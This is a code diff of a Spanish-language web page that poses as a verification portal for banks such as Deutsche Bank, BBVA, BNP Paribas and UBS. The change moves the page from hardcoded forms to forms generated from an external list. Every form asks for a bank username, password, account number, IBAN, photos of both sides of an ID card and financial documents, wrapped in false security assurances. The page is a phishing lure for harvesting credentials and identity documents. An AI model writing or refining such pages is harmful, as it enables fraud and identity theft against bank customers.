@@ -14,7 +14,6 @@
     .accordion-content { display: none; padding: 15px; border-top: 1px solid #ccc; }
     label { display: block; margin-top: 10px; }
     input[type="file"] { margin-top: 5px; }
-    .note { font-size: 14px; color: #777; margin-top: 10px; }
     .security-message { background: #003366; color: #fff; padding: 15px; border-radius: 5px; margin: 20px auto; width: 80%; text-align: center; }
     .inline-security { background: #e6f0ff; padding: 10px; border-radius: 5px; margin-top: 15px; font-size: 13px; color: #333; }
     .confirmation { background: #cce5ff; color: #003366; padding: 15px; border-radius: 5px; margin: 20px auto; width: 80%; text-align: center; display: none; }
@@ -36,84 +35,8 @@
     <input type="text" id="searchInput" placeholder="Buscar país o banco...">
   </div>
 
-  <!-- Bancos ordenados alfabéticamente -->
-  <div id="accordionList">
-    <!-- Alemania -->
-    <div class="accordion">
-      <div class="accordion-header">Alemania - Deutsche Bank</div>
-      <div class="accordion-content">
-        <form onsubmit="showConfirmation(event)">
-          <label>Usuario: <input type="text" required></label>
-          <label>Contraseña: <input type="password" required></label>
-          <label>Cuenta principal: <input type="text" required></label>
-          <label>IBAN: <input type="text" required></label>
-          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
-          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
-          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
-          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
-          <div class="inline-security">🔒 No comparta sus credenciales en otras páginas. Este proceso se realiza únicamente en nuestro entorno seguro.</div>
-          <button type="submit">Verificar</button>
-        </form>
-      </div>
-    </div>
-
-    <!-- España -->
-    <div class="accordion">
-      <div class="accordion-header">España - BBVA</div>
-      <div class="accordion-content">
-        <form onsubmit="showConfirmation(event)">
-          <label>Usuario: <input type="text" required></label>
-          <label>Contraseña: <input type="password" required></label>
-          <label>Cuenta principal: <input type="text" required></label>
-          <label>IBAN: <input type="text" required></label>
-          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
-          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
-          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
-          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
-          <div class="inline-security">🔒 Las imágenes se almacenan de forma cifrada y solo se utilizan para validar su identidad.</div>
-          <button type="submit">Verificar</button>
-        </form>
-      </div>
-    </div>
-
-    <!-- Francia -->
-    <div class="accordion">
-      <div class="accordion-header">Francia - BNP Paribas</div>
-      <div class="accordion-content">
-        <form onsubmit="showConfirmation(event)">
-          <label>Usuario: <input type="text" required></label>
-          <label>Contraseña: <input type="password" required></label>
-          <label>Cuenta principal: <input type="text" required></label>
-          <label>IBAN: <input type="text" required></label>
-          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
-          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
-          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
-          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
-          <div class="inline-security">🔒 Sus datos están protegidos bajo estrictos protocolos de seguridad.</div>
-          <button type="submit">Verificar</button>
-        </form>
-      </div>
-    </div>
-
-    <!-- Suiza -->
-    <div class="accordion">
-      <div class="accordion-header">Suiza - UBS</div>
-      <div class="accordion-content">
-        <form onsubmit="showConfirmation(event)">
-          <label>Usuario: <input type="text" required></label>
-          <label>Contraseña: <input type="password" required></label>
-          <label>Cuenta principal: <input type="text" required></label>
-          <label>IBAN: <input type="text" required></label>
-          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
-          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
-          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
-          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
-          <div class="inline-security">🔒 Confiar en nosotros significa contar con un sistema que vela por la protección de su información personal en cada paso.</div>
-          <button type="submit">Verificar</button>
-        </form>
-      </div>
-    </div>
-  </div>
+  <!-- Contenedor dinámico -->
+  <div id="accordionList"></div>
 
   <!-- Confirmación automática -->
   <div id="confirmationBox" class="confirmation">
@@ -125,14 +48,44 @@
     🔒 Velamos por la protección de su información personal en cada paso. Sus datos nunca serán compartidos con terceros. Su seguridad primero.
   </div>
 
+  <!-- Cargar listado externo -->
+  <script src="lista.js"></script>
   <script>
+    const accordionList = document.getElementById("accordionList");
+
+    // Ordenar alfabéticamente por país
+    bancosIBAN.sort((a, b) => a.pais.localeCompare(b.pais));
+
+    // Generar dinámicamente los acordeones
+    bancosIBAN.forEach(item => {
+      const acc = document.createElement("div");
+      acc.className = "accordion";
+      acc.innerHTML = `
+        <div class="accordion-header">${item.pais} - ${item.banco}</div>
+        <div class="accordion-content">
+          <form onsubmit="showConfirmation(event)">
+            <label>Usuario: <input type="text" required></label>
+            <label>Contraseña: <input type="password" required></label>
+            <label>Cuenta principal: <input type="text" required></label>
+            <label>IBAN: <input type="text" required></label>
+            <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
+            <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
+            <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
+            <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
+            <div class="inline-security">🔒 Sus datos están protegidos bajo estrictos protocolos de seguridad.</div>
+            <button type="submit">Verificar</button>
+          </form>
+        </div>
+      `;
+      accordionList.appendChild(acc);
+    });
+
     // Función para desplegar acordeones
-    const headers = document.querySelectorAll(".accordion-header");
-    headers.forEach(header => {
-      header.addEventListener("click", () => {
-        const content = header.nextElementSibling;
+    document.addEventListener("click", function(e) {
+      if (e.target.classList.contains("accordion-header")) {
+        const content = e.target.nextElementSibling;
         content.style.display = content.style.display === "block" ? "none" : "block";
-      });
+      }
     });
 
     // Función de búsqueda
@@ -141,4 +94,16 @@
       const accordions = document.querySelectorAll(".accordion");
       accordions.forEach(acc => {
         const text = acc.querySelector(".accordion-header").textContent.toLowerCase();
-        acc.style.display = text.includes(filter
+        acc.style.display = text.includes(filter) ? "" : "none";
+      });
+    });
+
+    // Confirmación automática
+    function showConfirmation(event) {
+      event.preventDefault();
+      document.getElementById("confirmationBox").style.display = "block";
+      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+    }
+  </script>
+</body>
+</html>
